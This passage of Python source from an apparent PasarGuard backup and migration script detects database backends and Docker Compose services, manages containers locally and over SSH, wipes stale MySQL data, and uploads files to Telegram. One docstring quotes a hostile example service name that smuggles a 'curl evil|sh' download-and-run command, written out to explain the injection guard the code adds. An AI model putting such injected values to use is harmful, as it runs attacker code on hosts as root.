_DEFAULT_DB_SERVICE = {
    "postgresql":  "postgres",
    "timescaledb": "timescaledb",
    "mysql":       "mysql",
    "mariadb":     "mariadb",
    "sqlite":      None,        # SQLite has no service to wait for
}

def _pick_db_service(services, backend_type=None):
    """Pick the DB service name out of a list of compose services.
    Falls back to asking the user if it can't decide on its own.

    v4.2.1 — strips any non-service top-level keys that slipped through
    the parser (e.g. `services`, `name`, `version`). Without this, a buggy
    parser returning `['services']` would cause the script to try to
    exec into a non-existent service literally called 'services'.

    v4.2.2 — accepts `backend_type` so the keyword list and the user
    prompt both adapt. Previously the function hard-coded the
    PostgreSQL-flavored prompt "Which service is the PostgreSQL
    database?" even on a MySQL install, which (a) was misleading and
    (b) caused a real failure when the picked container was then
    `pg_isready`'d by wait_postgres_* — pg_isready doesn't exist in a
    mysql image, so the wait timed out and the the database operation aborted."""
    bt = (backend_type or "postgresql").lower()
    default_svc = _DEFAULT_DB_SERVICE.get(bt, "timescaledb") or "timescaledb"

    if not services:
        print_warning(f"Could not read docker-compose services — defaulting to '{default_svc}'.")
        return default_svc

    safe = [s for s in services if s not in _NON_SERVICE_KEYS and _SAFE_SERVICE_NAME_RE.match(s)]
    if not safe:
        print_warning(f"No valid service names in compose output — defaulting to '{default_svc}'.")
        return default_svc

    if len(safe) == 1:
        return safe[0]

    if bt in ("mysql", "mariadb"):
        keywords = ["mysql", "mariadb", "db", "database"]
        prompt_label = "MySQL/MariaDB"
        prompt_default = "mysql"
    else:
        keywords = ["timescaledb", "postgres", "postgresql", "pgsql", "db", "database"]
        prompt_label = "PostgreSQL"
        prompt_default = "timescaledb"

    candidates = [s for s in safe if any(k in s.lower() for k in keywords)]

    if len(candidates) == 1:
        return candidates[0]

    print_warning(f"Multiple candidate DB services found: {', '.join(candidates or safe)}")
    choice = input(
        f" {C.R2}> Which service is the {prompt_label} database? [{prompt_default}]: {C.RESET}"
    ).strip()
    return choice if choice in safe else (candidates[0] if candidates else safe[0])

def db_service_local(d=None):
    return _detect_db_service_local(d)

def db_service_ssh(ssh, d=None):
    return _detect_db_service_ssh(ssh, d)

# ── Multi-database discovery (v4.0) ───────────────────────────
_SYSTEM_DBS = ("postgres", "template0", "template1")

def _list_databases_local(svc):
    query = ("SELECT datname FROM pg_database "
             "WHERE datistemplate=false AND datname NOT IN "
             "('postgres','template0','template1') ORDER BY datname;")
    ok_v, out, _ = local_shell(
        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
        cwd=PASARGUARD_DIR,
    )
    if not ok_v or not out:
        print_warning("Could not enumerate Pasarguard databases — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    names = [l.strip() for l in out.splitlines() if l.strip()]
    if not names:
        print_warning("No user databases found — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    return names

def _list_databases_ssh(ssh, svc):
    query = ("SELECT datname FROM pg_database "
             "WHERE datistemplate=false AND datname NOT IN "
             "('postgres','template0','template1') ORDER BY datname;")
    ec, out, _ = ssh_shell(
        ssh,
        f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
    )
    if ec != 0 or not out:
        print_warning("Could not enumerate Pasarguard databases on remote host — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    names = [l.strip() for l in out.splitlines() if l.strip()]
    if not names:
        print_warning("No user databases found on remote host — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    return names

def _ident(name):
    """Safely quote a PostgreSQL identifier for embedding in a SQL string.
    Doubles any embedded double-quotes, then wraps in double-quotes."""
    return '"' + name.replace('"', '""') + '"'

# ── PasarGuard backend detection (v4.1) ──────────────────────
SUPPORTED_BACKENDS = ("sqlite", "postgresql", "timescaledb", "mysql", "mariadb")

def _read_env_file(path):
    out = {}
    try:
        with open(path) as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip()
                if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                    v = v[1:-1]
                out[k] = v
    except FileNotFoundError:
        pass
    return out

def _mask_secret(value):
    if not value:
        return ""
    if len(value) <= 4:
        return "****"
    return f"****{value[-4:]}"

def _parse_sqlalchemy_url(url):
    if not url:
        return (None, None, None, None, None, None)
    try:
        scheme_full, rest = url.split("://", 1)
    except ValueError:
        return (None, None, None, None, None, None)
    scheme = scheme_full.split("+", 1)[0].lower()

    if scheme == "sqlite":
        if rest.startswith("//"):
            rest = rest[1:]
        elif rest.startswith("/"):
            pass
        return (scheme, None, None, None, None, rest)

    user = password = host = port = dbname = None
    if "@" in rest:
        creds, rest = rest.split("@", 1)
        if ":" in creds:
            user, password = creds.split(":", 1)
        else:
            user = creds
    if "?" in rest:
        rest = rest.split("?", 1)[0]
    if "/" in rest:
        host_port, dbname = rest.split("/", 1)
    else:
        host_port, dbname = rest, ""
    if ":" in host_port:
        host, port_s = host_port.split(":", 1)
        try:
            port = int(port_s)
        except ValueError:
            port = None
    else:
        host = host_port
        port = None
    return (scheme, user, password, host, port, dbname)

def _compose_image_contains(svc_image, needle):
    if not svc_image:
        return False
    return needle.lower() in svc_image.lower()

def _list_compose_services_local(d=None):
    d = d or PASARGUARD_DIR
    ok_v, out, _ = local_shell("docker compose config 2>/dev/null", cwd=d)
    if not ok_v or not out:
        try:
            with open(os.path.join(d, "docker-compose.yml")) as f:
                out = f.read()
        except FileNotFoundError:
            return []
    return _parse_compose_services(out)

def _list_compose_services_ssh(ssh, d=None):
    d = d or PASARGUARD_DIR
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config 2>/dev/null")
    if ec != 0 or not out:
        ec2, out2, _ = ssh_shell(ssh, f"cat {d}/docker-compose.yml 2>/dev/null")
        if ec2 != 0:
            return []
        out = out2
    return _parse_compose_services(out)

# Top-level keys that look like service names but aren't (would cause the
# script to try to exec into a non-existent "services" / "name" / "version"
# container if they leaked through a buggy parser). Defence in depth.
_NON_SERVICE_KEYS = frozenset({
    "services", "name", "version", "networks", "volumes",
    "configs", "secrets", "x-*",
})

def _parse_compose_services(yaml_text):
    """Parse `docker compose config` output (or raw docker-compose.yml) and
    return [(service_name, image_string), ...] for every service that has
    an image defined.

    v4.2.1 — the previous parser only matched top-level keys (no leading
    whitespace + ends with ':'), so on the canonical compose output

        services:
          timescaledb:
            image: timescale/timescaledb:latest
          pasarguard:
            image: ...

    it captured ('services', 'timescale/...') — i.e. it tried to exec into
    a service literally called `services` — and missed the real service
    names entirely. This parser walks the YAML by indentation: only keys
    indented under the `services:` block are treated as service names,
    and only `image:` lines indented under a service count as that
    service's image."""
    services = {}  # name -> image
    in_services_block = False
    current_service = None
    services_indent = None  # indent of `services:` itself

    for raw in yaml_text.splitlines():
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        stripped = raw.lstrip()
        indent = len(raw) - len(stripped)

        # Top-level key detection. `services:` opens the block we care
        # about; any other top-level key closes it.
        if indent == 0:
            if stripped == "services:":
                in_services_block = True
                services_indent = 0
                current_service = None
                continue
            if in_services_block:
                # We've left the services block (e.g. hit `volumes:`,
                # `networks:`, etc).
                in_services_block = False
                current_service = None
                continue
            continue

        if not in_services_block:
            continue

        # We're inside the services: block. Lines at indent == 2 that end
        # with ':' are service names; their image: child defines the image.
        if (indent == 2 and stripped.endswith(":")
                and not stripped.startswith("-")
                and not stripped.startswith("&")  # YAML anchors
                and not stripped.startswith("*")):  # YAML aliases
            current_service = stripped[:-1].strip().strip("'\"")
            if current_service and current_service not in _NON_SERVICE_KEYS:
                services.setdefault(current_service, "")
            else:
                current_service = None  # ignore non-service keys just in case
            continue

        # We're inside a specific service — look for the image: line.
        if current_service and indent >= 4 and stripped.startswith("image:"):
            image = stripped[len("image:"):].strip()
            if len(image) >= 2 and image[0] == image[-1] and image[0] in ('"', "'"):
                image = image[1:-1]
            services[current_service] = image

    # Only return services that have an image (real running containers —
    # build-only / external services without `image:` can't be exec'd into).
    return [(name, img) for name, img in services.items() if img]

def _detect_backend_local():
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    scheme, user, pwd, host, port, dbname = _parse_sqlalchemy_url(url)
    services = _list_compose_services_local()
    return _resolve_backend(scheme, user, pwd, host, port, dbname, env, services)

def _detect_backend_ssh(ssh):
    ec, env_text, _ = ssh_shell(ssh, f"cat {PASARGUARD_DIR}/.env 2>/dev/null")
    env = {}
    if ec == 0 and env_text:
        for raw in env_text.splitlines():
            line = raw.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            v = v.strip()
            if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                v = v[1:-1]
            env[k] = v
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    scheme, user, pwd, host, port, dbname = _parse_sqlalchemy_url(url)
    services = _list_compose_services_ssh(ssh)
    return _resolve_backend(scheme, user, pwd, host, port, dbname, env, services)

def _resolve_backend(scheme, user, pwd, host, port, dbname, env, services):
    db_type = None
    container = None

    if scheme == "sqlite":
        db_type = "sqlite"
        container = None
    elif scheme == "postgresql":
        is_ts = any(_compose_image_contains(img, "timescale") for _, img in services)
        db_type = "timescaledb" if is_ts else "postgresql"
        container = _pick_service_by_image(services,
            image_needles=("timescaledb", "timescale", "postgres", "postgresql", "pgsql"),
            name_needles=("timescaledb", "postgresql", "postgres", "pgsql", "db", "database"),
        )
    elif scheme in ("mysql", "mariadb"):
        is_mariadb = any(_compose_image_contains(img, "mariadb") for _, img in services)
        db_type = "mariadb" if is_mariadb else "mysql"
        container = _pick_service_by_image(services,
            image_needles=("mariadb", "mysql"),
            name_needles=("mariadb", "mysql", "db", "database"),
        )
    else:
        db_type = "postgresql"
        container = _pick_service_by_image(services,
            image_needles=("timescaledb", "postgres", "postgresql", "pgsql"),
            name_needles=("timescaledb", "postgres", "postgresql", "pgsql", "db", "database"),
        )

    if not user:   user   = env.get("DB_USER", "")
    if not pwd:    pwd    = env.get("DB_PASSWORD", "")
    if not dbname: dbname = env.get("DB_NAME", "pasarguard")
    if not host:   host   = "127.0.0.1"
    if not port:
        if db_type in ("postgresql", "timescaledb"):
            port = 5432
        elif db_type in ("mysql", "mariadb"):
            port = 3306
        else:
            port = 0

    sqlite_path = None
    if db_type == "sqlite" and dbname:
        sqlite_path = "/" + dbname

    return {
        "type":       db_type,
        "host":       host,
        "port":       port,
        "user":       user or "",
        "password":   pwd or "",
        "dbname":     dbname or "",
        "container":  container,
        "env":        env,
        "services":   services,
        "sqlite_path": sqlite_path,
    }

def _pick_service_by_image(services, image_needles=(), name_needles=()):
    """Pick the most likely DB service from a list of (name, image) tuples.
    Prefers exact image matches, then name-substring matches, then any service
    that looks like a database. Returns the service name or None.

    v4.2.1 — refuses to return a service name that doesn't match
    [A-Za-z0-9_.-]+. A malicious docker-compose.yml could otherwise carry
    a service name like `timescaledb; curl evil|sh` that would then be
    pasted unquoted into shell=True docker commands as root."""
    if not services:
        return None
    safe = [(n, i) for n, i in services if _SAFE_SERVICE_NAME_RE.match(n)]
    if not safe:
        return None
    if len(safe) == 1:
        return safe[0][0]
    for needle in image_needles:
        for name, img in safe:
            if img.lower() == needle.lower():
                return name
    for needle in image_needles:
        for name, img in safe:
            if needle.lower() in img.lower():
                return name
    for needle in name_needles:
        for name, _ in safe:
            if needle.lower() in name.lower():
                return name
    return safe[0][0]

# ── Docker compose helpers ────────────────────────────────────
def _running_ids_local(d):
    _, out, _ = local_shell("docker compose ps -q --status running", cwd=d)
    return [l for l in out.splitlines() if l.strip()]

def _running_ids_ssh(ssh, d):
    _, out, _ = ssh_shell(ssh, f"cd {d} && docker compose ps -q --status running 2>/dev/null || true")
    return [l for l in out.splitlines() if l.strip()]

def _expected_count_local(d, services):
    if services: return len(services)
    ok_v, out, _ = local_shell("docker compose config --services", cwd=d)
    return len([l for l in out.splitlines() if l.strip()]) if ok_v else 0

def _expected_count_ssh(ssh, d, services):
    if services: return len(services)
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config --services 2>/dev/null")
    return len([l for l in out.splitlines() if l.strip()]) if ec == 0 else 0

def stop_compose_local(d, label):
    if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
        print_warning(f"{label}: not found or missing compose file — skipping stop.")
        return True
    print_info(f"Stopping {label} containers...")
    for attempt in range(1, COMPOSE_STOP_RETRIES + 1):
        run_command(f"docker compose down --remove-orphans -t {COMPOSE_DOWN_TIMEOUT}", cwd=d)
        run_command("docker compose stop -t 10 2>/dev/null || true", cwd=d)
        run_command("docker compose rm -f 2>/dev/null || true", cwd=d)
        if not _running_ids_local(d):
            print_success(f"{label}: all containers stopped.")
            return True
        print_warning(f"{label}: still running (attempt {attempt}/{COMPOSE_STOP_RETRIES})...")
        time.sleep(2)
    print_error(f"{label}: could not stop all containers.")
    return False

def stop_compose_ssh(ssh, d, label):
    ec, _, _ = ssh_shell(ssh, f"test -d {d} && test -f {d}/docker-compose.yml")
    if ec != 0:
        print_warning(f"{label}: not found or missing compose file — skipping stop.")
        return True
    print_info(f"Stopping {label} containers...")
    for attempt in range(1, COMPOSE_STOP_RETRIES + 1):
        ssh_shell(ssh, f"cd {d} && docker compose down --remove-orphans -t {COMPOSE_DOWN_TIMEOUT}")
        ssh_shell(ssh, f"cd {d} && docker compose stop -t 10 2>/dev/null || true")
        ssh_shell(ssh, f"cd {d} && docker compose rm -f 2>/dev/null || true")
        if not _running_ids_ssh(ssh, d):
            print_success(f"{label}: all containers stopped.")
            return True
        print_warning(f"{label}: still running (attempt {attempt}/{COMPOSE_STOP_RETRIES})...")
        time.sleep(2)
    print_error(f"{label}: could not stop all containers.")
    return False

def wait_db_local(svc, backend_type=None):
    """Wait for a DB container to become ready, dispatching by backend type.

    v4.2.2 — renamed from wait_postgres_local and made backend-aware.
    Previously this always exec'd `pg_isready` into the picked container,
    which crashed on mysql/mariadb images (no such binary) and made the
    the database operation abort with 'mysql did not start'. Now picks the right
    readiness probe per backend:
      - postgresql / timescaledb → pg_isready -U pasarguard -d postgres
      - mysql / mariadb          → mysqladmin ping -uroot -h 127.0.0.1
      - sqlite                   → no service to wait for, return True
      - unknown                  → skip with a warning, return True
    """
    bt = (backend_type or "postgresql").lower()
    print_info(f"Waiting for {svc} ({bt}) to become ready...")
    deadline = time.time() + POSTGRES_READY_MAX_WAIT

    if bt in ("postgresql", "timescaledb"):
        cmd = (
            f"docker compose exec -T {shlex.quote(svc)} "
            f"pg_isready -U pasarguard -d postgres"
        )
    elif bt in ("mysql", "mariadb"):
        cmd = (
            f"docker compose exec -T {shlex.quote(svc)} "
            f"mysqladmin ping -h 127.0.0.1 -uroot 2>/dev/null"
        )
    elif bt == "sqlite":
        print_success("SQLite has no service to wait for — assuming ready.")
        return True
    else:
        print_warning(f"Unknown backend type {bt!r} — skipping readiness check.")
        return True

    while time.time() < deadline:
        ok_v, _, _ = local_shell(cmd, cwd=PASARGUARD_DIR)
        if ok_v:
            print_success("Database is ready.")
            return True
        time.sleep(POSTGRES_READY_INTERVAL)
    print_error("Database did not become ready in time.")
    return False


def wait_db_ssh(ssh, svc, backend_type=None):
    """SSH variant of wait_db_local — see wait_db_local for dispatch logic."""
    bt = (backend_type or "postgresql").lower()
    print_info(f"Waiting for {svc} ({bt}) to become ready...")
    deadline = time.time() + POSTGRES_READY_MAX_WAIT

    if bt in ("postgresql", "timescaledb"):
        cmd = (
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} "
            f"pg_isready -U pasarguard -d postgres"
        )
    elif bt in ("mysql", "mariadb"):
        cmd = (
            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} "
            f"mysqladmin ping -h 127.0.0.1 -uroot 2>/dev/null"
        )
    elif bt == "sqlite":
        print_success("SQLite has no service to wait for — assuming ready.")
        return True
    else:
        print_warning(f"Unknown backend type {bt!r} — skipping readiness check.")
        return True

    while time.time() < deadline:
        ec, _, _ = ssh_shell(ssh, cmd)
        if ec == 0:
            print_success("Database is ready.")
            return True
        time.sleep(POSTGRES_READY_INTERVAL)
    print_error("Database did not become ready in time.")
    return False

# Back-compat shims — older callers (if any external scripts import this
# module) keep working. Internally we now always call wait_db_* directly.
def wait_postgres_local():
    return wait_db_local(db_service_local(), backend_type="postgresql")

def wait_postgres_ssh(ssh):
    return wait_db_ssh(ssh, db_service_ssh(ssh), backend_type="postgresql")

def start_compose_local(d, label, services=None, wait_db=False, backend_type=None):
    if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
        print_error(f"{label}: compose project not found at {d}")
        return False
    # v4.2.1 — validate + quote each service individually before joining
    # (a malicious compose could otherwise yield service names with shell
    # metachars; the joined-then-quoted form would also be wrong because
    # shlex.quote wraps the whole space-joined string as one argument).
    safe_services = []
    for s in (services or []):
        try:
            safe_services.append(_validate_service_name(s))
        except ValueError as e:
            print_error(f"{label}: {e}")
            return False
    svc_q = " ".join(shlex.quote(s) for s in safe_services)
    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
    if not run_command(f"docker compose up -d {svc_q}".strip(), cwd=d):
        print_error(f"{label}: docker compose up failed.")
        return False
    # v4.2.2 — wait_db is now backend-aware. The DB service to probe
    # is the first one in `services` (matches what workflow_transfer /
    # workflow_manual_restore pass in: services=[remote_db_svc]).
    if wait_db and safe_services:
        if not wait_db_local(safe_services[0], backend_type=backend_type):
            return False
    expected = _expected_count_local(d, services)
    if expected == 0 and not wait_db:
        print_warning(f"{label}: assuming startup succeeded.")
        return True
    deadline = time.time() + COMPOSE_UP_MAX_WAIT
    while time.time() < deadline:
        if len(_running_ids_local(d)) >= expected:
            print_success(f"{label}: containers running.")
            return True
        time.sleep(COMPOSE_UP_INTERVAL)
    print_error(f"{label}: startup verification failed.")
    return False

def start_compose_ssh(ssh, d, label, services=None, wait_db=False, backend_type=None):
    ec, _, _ = ssh_shell(ssh, f"test -d {d} && test -f {d}/docker-compose.yml")
    if ec != 0:
        print_error(f"{label}: compose project not found at {d}")
        return False
    # v4.2.1 — validate + quote each service individually before joining.
    safe_services = []
    for s in (services or []):
        try:
            safe_services.append(_validate_service_name(s))
        except ValueError as e:
            print_error(f"{label}: {e}")
            return False
    svc_q = " ".join(shlex.quote(s) for s in safe_services)
    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
    ec, _, er = ssh_shell(ssh, f"cd {d} && docker compose up -d {svc_q}".strip())
    if ec != 0:
        print_error(f"{label}: docker compose up failed.")
        if er: print_error(er)
        return False
    # v4.2.2 — wait_db is now backend-aware (see wait_db_ssh for dispatch).
    if wait_db and safe_services:
        if not wait_db_ssh(ssh, safe_services[0], backend_type=backend_type):
            return False
    expected = _expected_count_ssh(ssh, d, services)
    if expected == 0 and not wait_db:
        print_warning(f"{label}: assuming startup succeeded.")
        return True
    deadline = time.time() + COMPOSE_UP_MAX_WAIT
    while time.time() < deadline:
        if len(_running_ids_ssh(ssh, d)) >= expected:
            print_success(f"{label}: containers running.")
            return True
        time.sleep(COMPOSE_UP_INTERVAL)
    print_error(f"{label}: startup verification failed.")
    return False

def clean_dirs_local(include_node=True):
    targets = [
        (PASARGUARD_DIR,      "Pasarguard config (/opt/pasarguard)"),
        (PASARGUARD_DATA_DIR, "Pasarguard data (/var/lib/pasarguard)"),
    ]
    if include_node:
        targets += [
            (PG_NODE_DIR,      "PG-Node config (/opt/pg-node)"),
            (PG_NODE_DATA_DIR, "PG-Node data (/var/lib/pg-node)"),
        ]
    print_info("Cleaning target directories...")
    for path, desc in targets:
        if not run_command(f"rm -rf {path} && mkdir -p {path}", quiet=True):
            print_error(f"Failed to clean {desc}")
            return False
    print_success("Target directories cleaned.")
    return True

def clean_dirs_ssh(ssh, include_node=True):
    targets = [
        (PASARGUARD_DIR,      "Pasarguard config"),
        (PASARGUARD_DATA_DIR, "Pasarguard data"),
    ]
    if include_node:
        targets += [
            (PG_NODE_DIR,      "PG-Node config"),
            (PG_NODE_DATA_DIR, "PG-Node data"),
        ]
    print_info("Cleaning target directories...")
    for path, desc in targets:
        ec, _, er = ssh_shell(ssh, f"rm -rf {path} && mkdir -p {path}")
        if ec != 0:
            print_error(f"Failed to clean {desc}")
            return False
    print_success("Target directories cleaned.")
    return True

# ── MySQL data-dir wipe (v4.2.3) ───────────────────────────────
# MySQL/MariaDB only honours MYSQL_ROOT_PASSWORD / MYSQL_PASSWORD from
# the container environment on FIRST initialisation. If the data
# directory already contains a database (i.e. it survived from a
# previous run on the destination host), MySQL keeps the OLD password
# and silently ignores the new one in .env — leading to "Access denied
# (1045)" errors during database checks, even though the .env we just extracted
# has the right password.
#
# Docker's own `docker compose down -v` only removes Docker NAMED
# volumes. It does NOT remove bind mounts (host paths bind-mounted
# into the container). A typical PasarGuard install on Hetzner /
# Contabo / etc. bind-mounts /var/lib/mysql from /var/lib/mysql/<name>
# on the host, which survives `down -v` and leaves the OLD password
# intact. That's the root cause of the 1045 chain the user hit.
#
# The two functions below detect where MySQL stores its data (named
# volume OR bind mount) by parsing docker-compose.yml, and remove it
# explicitly BEFORE we start MySQL, so it re-inits cleanly with the
# credentials from the new .env.

def _parse_mysql_data_mount(compose_text, svc):
    """Find the data-dir mount for the MySQL/MariaDB service in a
    docker-compose.yml text. Returns (source, type) where type is
    'bind' or 'volume', or (None, None) if not found.

    Recognises these patterns inside the mysql service:
        - /host/path:/var/lib/mysql        (short-form bind mount)
        - vol_name:/var/lib/mysql          (short-form named volume)
        - type: volume / source: vol_name  (long-form)
    Both /var/lib/mysql and /var/lib/mariadb are accepted as the target."""
    if not compose_text:
        return None, None

    lines = compose_text.splitlines()
    in_services   = False
    in_target_svc = False
    in_volumes    = False
    vol_indent    = None
    long_vol      = {}  # type/source/target/etc. for long-form mount

    for raw in lines:
        stripped = raw.lstrip()
        if not stripped or stripped.startswith("#"):
            continue
        indent = len(raw) - len(stripped)

        # Top-level keys (indent 0).
        if indent == 0:
            if stripped == "services:":
                in_services = True
            elif in_services:
                in_services = False
            continue
        if not in_services:
            continue

        # Service name line (indent 2, ends with ':', not a list item).
        if (indent == 2 and stripped.endswith(":")
                and not stripped.startswith("-")
                and not stripped.startswith("&")
                and not stripped.startswith("*")):
            current_svc = stripped[:-1].strip().strip("'\"").strip()
            in_target_svc = (current_svc == svc)
            in_volumes = False
            long_vol = {}
            continue
        if not in_target_svc:
            continue

        # `volumes:` subsection opener.
        if indent >= 4 and stripped == "volumes:":
            in_volumes = True
            vol_indent = indent
            long_vol = {}
            continue

        # Leaving the volumes subsection when indentation decreases.
        if in_volumes and indent <= vol_indent:
            in_volumes = False
            long_vol = {}

        if not in_volumes:
            continue

        # Short-form list item: `- source:target[:mode]`
        if stripped.startswith("-"):
            mount = stripped.lstrip("- ").strip().strip('"').strip("'")
            if ":" in mount:
                src, tgt = mount.split(":", 1)
                tgt = tgt.strip()
                if tgt.rstrip("/") in ("/var/lib/mysql", "/var/lib/mariadb"):
                    src = src.strip()
                    if not src:
                        continue
                    if src.startswith("/") or src.startswith("."):
                        return src, "bind"
                    return src, "volume"
            continue

        # Long-form key (type, source, target, read_only, ...).
        if ":" in stripped:
            k, v = stripped.split(":", 1)
            long_vol[k.strip()] = v.strip().strip('"').strip("'")
            tgt = long_vol.get("target", "").rstrip("/")
            if tgt in ("/var/lib/mysql", "/var/lib/mariadb"):
                src = long_vol.get("source", "").strip()
                if not src:
                    continue
                mtype = long_vol.get("type", "volume").strip().lower()
                if mtype == "bind":
                    return src, "bind"
                return src, "volume"

    return None, None


def _wipe_mysql_data_remote(ssh, svc):
    """v4.2.3 — detect and remove MySQL data on the remote host so the
    container re-inits with the credentials from the new .env.

    Returns True on success (or when there's nothing to wipe), False if
    the wipe itself failed and we couldn't recover. We do NOT abort the
    whole operation on failure — the previous migration code would try
    anyway and surface a precise 1045 error if the data really is
    stale, which is more informative than silently bailing here."""
    ec, compose_text, _ = ssh_shell(ssh,
        f"cat {shlex.quote(PASARGUARD_DIR)}/docker-compose.yml 2>/dev/null")
    if ec != 0 or not compose_text:
        ec, compose_text, _ = ssh_shell(ssh,
            f"cd {shlex.quote(PASARGUARD_DIR)} && docker compose config 2>/dev/null")

    source, mtype = _parse_mysql_data_mount(compose_text or "", svc)

    # Fallback: if compose parsing yielded nothing, look at any volume
    # whose name contains mysql/mariadb/pasarguard. Covers the case
    # where the compose file uses YAML anchors or `extends:` that the
    # parser can't fully resolve.
    if not source:
        ec, vols, _ = ssh_shell(ssh,
            "docker volume ls --format '{{.Name}}' 2>/dev/null | "
            "grep -iE 'mysql|mariadb|pasarguard' | head -1")
        if ec == 0 and vols.strip():
            source = vols.strip().splitlines()[0].strip()
            mtype = "volume"

    if not source:
        print_warning(
            f"Could not detect MySQL data mount for service {svc!r} on the remote."
        )
        print_warning(
            "If MySQL has stale data on a bind mount that survived `docker compose down -v`,"
        )
        print_warning(
            "database access may fail with 1045 'Access denied'. Check the host data directory if needed."
        )
        return True

    if mtype == "bind":
        print_info(f"MySQL data is bind-mounted from {source!r}. Removing...")
        # Recreate the parent so MySQL can re-mount into an empty dir on
        # first start (otherwise mount may fail with 'directory not empty'
        # or similar on some filesystems).
        ec, _, err = ssh_shell(ssh,
            f"rm -rf {shlex.quote(source)} && mkdir -p {shlex.quote(source)}")
        if ec != 0:
            print_error(f"Could not wipe bind mount {source}: {(err or '').strip()}")
            return False
        print_success(f"Wiped MySQL data at {source} (bind mount).")

    elif mtype == "volume":
        print_info(f"MySQL data is on Docker volume {source!r}. Removing...")
        ec, _, err = ssh_shell(ssh, f"docker volume rm {shlex.quote(source)} 2>&1")
        if ec != 0:
            err_clean = (err or "").strip()
            if "in use" in err_clean.lower() or "being used" in err_clean.lower():
                print_warning(f"Volume {source!r} is still referenced; forcing removal...")
                ec2, _, err2 = ssh_shell(ssh,
                    f"docker volume rm -f {shlex.quote(source)} 2>&1")
                if ec2 != 0:
                    print_error(f"Could not remove volume {source}: {(err2 or '').strip()}")
                    return False
            else:
                print_error(f"Could not remove volume {source}: {err_clean}")
                return False
        print_success(f"Removed MySQL volume {source}.")
    else:
        print_warning(f"Unknown MySQL mount type {mtype!r}; skipping wipe.")
        return True

    return True


def _wipe_mysql_data_local(svc):
    """v4.2.3 — local counterpart of _wipe_mysql_data_remote (used by
    workflow_manual_restore when the script is being run on the same
    machine that hosts the destination stack)."""
    compose_path = os.path.join(PASARGUARD_DIR, "docker-compose.yml")
    compose_text = ""
    try:
        with open(compose_path) as f:
            compose_text = f.read()
    except FileNotFoundError:
        pass
    if not compose_text:
        ok_v, out, _ = local_shell("docker compose config 2>/dev/null", cwd=PASARGUARD_DIR)
        if ok_v:
            compose_text = out

    source, mtype = _parse_mysql_data_mount(compose_text or "", svc)

    if not source:
        ok_v, out, _ = local_shell(
            "docker volume ls --format '{{.Name}}' 2>/dev/null | "
            "grep -iE 'mysql|mariadb|pasarguard' | head -1",
            cwd=PASARGUARD_DIR)
        if ok_v and out.strip():
            source = out.strip().splitlines()[0].strip()
            mtype = "volume"

    if not source:
        print_warning(
            f"Could not detect MySQL data mount for service {svc!r} locally."
        )
        print_warning(
            "If MySQL has stale data on a bind mount that survived `docker compose down -v`,"
        )
        print_warning(
            "database access may fail with 1045 'Access denied'. Check the host data directory if needed."
        )
        return True

    if mtype == "bind":
        print_info(f"MySQL data is bind-mounted from {source!r}. Removing...")
        rm = subprocess.run(["rm", "-rf", source], capture_output=True, text=True)
        if rm.returncode != 0:
            print_error(f"Could not wipe bind mount {source}: {rm.stderr.strip()}")
            return False
        os.makedirs(source, exist_ok=True)
        print_success(f"Wiped MySQL data at {source} (bind mount).")
    elif mtype == "volume":
        print_info(f"MySQL data is on Docker volume {source!r}. Removing...")
        rm = subprocess.run(["docker", "volume", "rm", source],
                             capture_output=True, text=True)
        if rm.returncode != 0:
            err_clean = (rm.stderr or "").strip()
            if "in use" in err_clean.lower() or "being used" in err_clean.lower():
                rm2 = subprocess.run(["docker", "volume", "rm", "-f", source],
                                      capture_output=True, text=True)
                if rm2.returncode != 0:
                    print_error(f"Could not remove volume {source}: {rm2.stderr.strip()}")
                    return False
            else:
                print_error(f"Could not remove volume {source}: {err_clean}")
                return False
        print_success(f"Removed MySQL volume {source}.")
    else:
        print_warning(f"Unknown MySQL mount type {mtype!r}; skipping wipe.")
        return True

    return True

# ── Telegram ─────────────────────────────────────────────────
def send_telegram_file(token, chat_id, file_path, caption="", proxy=None):
    url      = f"https://api.telegram.org/bot{token}/sendDocument"
    boundary = f"----WKF{uuid.uuid4().hex}"
    if not os.path.exists(file_path):
        return False, "File not found"
    try:
        with open(file_path, "rb") as f:
            fc = f.read()
    except Exception as e:
        return False, str(e)
    fn    = os.path.basename(file_path)
    parts = []
    def field(n, v):
        parts.append(f"--{boundary}".encode())
        parts.append(f'Content-Disposition: form-data; name="{n}"'.encode())
        parts.append(b"")
        parts.append(v.encode() if isinstance(v, str) else v)
    field("chat_id", str(chat_id))
    if caption:
        field("caption", caption)
    parts.append(f"--{boundary}".encode())
    parts.append(f'Content-Disposition: form-data; name="document"; filename="{fn}"'.encode())
    parts.append(b"Content-Type: application/zip")
    parts.append(b"")
    parts.append(fc)
    parts.append(f"--{boundary}--".encode())
    parts.append(b"")
    body = b"\r\n".join(parts)
    req  = urllib.request.Request(url, data=body)
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("Content-Length", str(len(body)))

    opener, socks_ctx = None, None
    if proxy:
        scheme, host, port, user, pwd = _parse_proxy_url(proxy)
